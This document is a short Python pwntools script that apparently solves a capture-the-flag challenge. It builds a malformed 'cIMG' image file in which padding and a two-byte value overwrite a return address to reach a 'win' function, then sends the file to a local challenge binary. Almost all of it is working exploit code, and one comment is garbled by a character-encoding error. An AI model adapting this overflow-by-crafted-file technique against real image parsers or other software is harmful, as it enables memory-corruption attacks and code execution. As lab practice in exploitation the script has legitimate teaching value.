import struct
from pwn import *
context.arch = 'amd64'  # …Ë÷√º‹ππŒ™ x86


color ={"red":  b"\xff\x00\x00",
        "white":b"\xff\xff\xff",
        "green":b"\x00\xff\x00",
        "grey": b"\x80\x80\x80",
        "blue": b"\x00\x00\xff"
        }


width = 76
height = 24

shellcode = b"A"*0xA9 + 0x3b42.to_bytes(2, "little")
shellcode += b"B"*(width*height - len(shellcode))





def handle_1337():
    sprite = 0
    cimg_bytes = b""
    command_c = 0
    c_base_x = width - 1
    c_base_y = 0
    cimg_bytes += b"\x03\x00" + sprite.to_bytes(1, "little") + width.to_bytes(1, "little") + height.to_bytes(1, "little")
    cimg_bytes += shellcode
        # cimg_bytes += row[0][3].to_bytes(1, "little")
    command_c += 1
    cimg_bytes += b"\x04\x00" + sprite.to_bytes(1, "little") + color["white"] +c_base_x.to_bytes(1, "little") + c_base_y.to_bytes(1, "little") + 0x2.to_bytes(1, "little") + 0x1.to_bytes(1, "little") + 0xff.to_bytes(1, "little")
    command_c += 1



    cimg_bytes += b"\x39\x05" + b"\x00\x00\x00\xAA\x01"
    command_c += 1

    return command_c, cimg_bytes

command_c, cimg_data = handle_1337()
cimg = b'\x63\x49\x4D\x47' + b"\x04\x00" + width.to_bytes(1,"little") + height.to_bytes(1, "little") + command_c.to_bytes(4, "little") + cimg_data


with open('test.bin', 'wb') as f:
    f.write(cimg)


p = process("/challenge/integration-cimg-screenshot-win")

p.send(cimg)
